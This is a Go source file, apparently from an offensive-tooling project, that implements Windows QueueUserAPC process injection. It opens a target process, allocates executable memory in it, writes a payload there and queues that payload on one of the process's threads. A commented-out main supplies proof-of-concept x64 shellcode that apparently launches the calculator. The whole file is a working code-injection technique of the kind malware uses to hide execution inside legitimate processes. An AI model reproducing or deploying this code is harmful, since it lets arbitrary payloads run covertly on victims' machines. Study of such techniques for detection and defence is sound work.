package main

import "os"
import "fmt"
import "syscall"
import "unsafe"


func OpenProcess(processAccess int, bInheritHandle int, processId uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("OpenProcess").Call(
      uintptr(processAccess),
      uintptr(bInheritHandle),
      uintptr(processId),
   )
   return uintptr(ret)
}


func VirtualAllocEx(hProcess uintptr, lpAddress uintptr, dwSize uintptr, flAllocationType uint, flProtect uint) uintptr {
   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualAllocEx").Call(
      uintptr(hProcess),
      uintptr(lpAddress),
      uintptr(dwSize),
      uintptr(flAllocationType),
      uintptr(flProtect),
   )
   return uintptr(ret)
}


func WriteProcessMemory(hProcess uintptr, lpAddress uintptr, lpBuffer uintptr, nSize uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("WriteProcessMemory").Call(
      uintptr(hProcess),
      uintptr(lpAddress),
      uintptr(lpBuffer),
      uintptr(nSize),
   )
   return uintptr(ret)
}


func Thread32First(hSnapshot uintptr, lpte uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("Thread32First").Call(
      uintptr(hSnapshot),
      uintptr(lpte),
   )
   return uintptr(ret)
}


func Thread32Next(hSnapshot uintptr, lpte uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("Thread32Next").Call(
      uintptr(hSnapshot),
      uintptr(lpte),
   )
   return uintptr(ret)
}


func OpenThread(dwDesiredAccess uint, bInheritHandle int, dwThreadId uint32) uintptr {
   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("OpenThread").Call(
      uintptr(dwDesiredAccess),
      uintptr(bInheritHandle),
      uintptr(dwThreadId),
   )
   return uintptr(ret)
}


func QueueUserAPC(pfnAPC uintptr, hThread uintptr, dwData uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("QueueUserAPC").Call(
      uintptr(pfnAPC),
      uintptr(hThread),
      uintptr(dwData),
   )
   return uintptr(ret)
}


func CloseHandle(hProcess uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("CloseHandle").Call(
      uintptr(hProcess),
   )
   return uintptr(ret)
}


func GetThreads(pid uintptr) []uint32 {
   var thread_ids_slice []uint32;
   snapshot, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPTHREAD, 0)
   if err != nil {
         fmt.Println("[-] Error calling CreateToolhelp32Snapshot:", err);
   }

   type ThreadEntry32 struct {
      Size           uint32
      tUsage         uint32
      ThreadID       uint32
      OwnerProcessID uint32
      BasePri        int32
      DeltaPri       int32
      Flags          uint32
   }

   var te ThreadEntry32;
   te.Size = uint32(unsafe.Sizeof(te));
   Thread32First(uintptr(snapshot), uintptr(unsafe.Pointer(&te)));
 
   for{

      if (Thread32Next(uintptr(snapshot), uintptr(unsafe.Pointer(&te))) == 0) { break }
      if (te.OwnerProcessID == uint32(pid)){
         thread_ids_slice = append(thread_ids_slice, te.ThreadID)
      }
   }
   CloseHandle(uintptr(snapshot));
   return thread_ids_slice;
}


func QueueUserAPC_Injection(process_name string, payload []byte) {
   var proc_handles_slice []uintptr = GetProcessByName(process_name);
   var first_proc = proc_handles_slice[0];
   var pid uintptr = GetProcessId(first_proc);
   fmt.Println("[+] Process PID: \t\t", pid);

   // OpenProcess
   var proc_handle uintptr = OpenProcess(0x001F0FFF, 0, pid);
   if (proc_handle == 0){
      fmt.Println("[-] OpenProcess API call failed. ");
      os.Exit(-1);
   }
   fmt.Println("[+] Process handle: \t\t", fmt.Sprintf("0x%x", proc_handle));

   // VirtualAllocEx
   var assigned_address uintptr = VirtualAllocEx(proc_handle, 0, uintptr(len(payload)), 0x1000, 0x20);
   if (assigned_address == 0){
      fmt.Println("[-] VirtualAllocEx API call failed. ");
      os.Exit(-1);
   }
   fmt.Println("[+] Assigned address: \t\t", fmt.Sprintf("0x%x", assigned_address));

   // WriteProcessMemory
   var res uintptr = WriteProcessMemory(proc_handle, assigned_address, uintptr(unsafe.Pointer(&payload[0])), uintptr(len(payload)));
   if (res == 0){
      fmt.Println("[-] WriteProcessMemory API call failed. ");
      os.Exit(-1);
   }
   fmt.Println("[+] WriteProcessMemory response:", res);

   // OpenThread
   var thread_ids_slice []uint32 = GetThreads(pid);
   var first_thread uint32 = thread_ids_slice[0];
   fmt.Println("[+] First thread:\t\t", first_thread);
   var thread_handle uintptr = OpenThread(0x0010, 0, first_thread);
   fmt.Println("[+] Thread handle:\t\t", thread_handle, "(", fmt.Sprintf("0x%x", thread_handle), ")");

   // QueueUserAPC
   var queueUserAPC_res uintptr = QueueUserAPC(assigned_address, thread_handle, 0);
   fmt.Println("[+] queueUserAPC_res:\t\t", queueUserAPC_res);

   // CloseHandle
   CloseHandle(thread_handle);
   CloseHandle(proc_handle);
}


/*
func main() {
   process_name := os.Args[1]
   fmt.Println("[+] Process name: \t\t", process_name);
   var payload []byte = []byte{0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3}
   QueueUserAPC_Injection(process_name, payload);
}
*/